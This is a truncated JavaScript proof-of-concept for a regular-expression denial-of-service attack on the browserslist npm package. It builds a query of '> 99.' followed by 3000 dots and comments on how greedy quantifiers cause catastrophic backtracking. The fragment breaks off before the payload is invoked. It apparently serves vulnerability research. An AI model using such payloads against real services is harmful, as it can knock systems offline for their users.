async function exploit() {
   // Load the target package in a controlled research environment
   const browserslist = require('browserslist');

   // Craft a malicious query string designed to trigger catastrophic backtracking.
   // The payload starts with a popularity selector ('> 99.') followed by thousands 
   // of sequential dots. In vulnerable versions, the internal regex/parser that 
   // handles floating-point percentages or version tokens (e.g., patterns using \d*\.?\d+) 
   // contains overlapping or ambiguous greedy quantifiers.
   const maliciousPayload = '> 99.' + '.'.repeat(3000);

   console.log(`[PoC] Triggering ReDoS with payload length: ${maliciousPayload.length}`);

   // Invoking the library forces it to parse and validate the crafted query against 
   // its internal query-resolving regexes. Due to quantifier ambiguity, the regex 
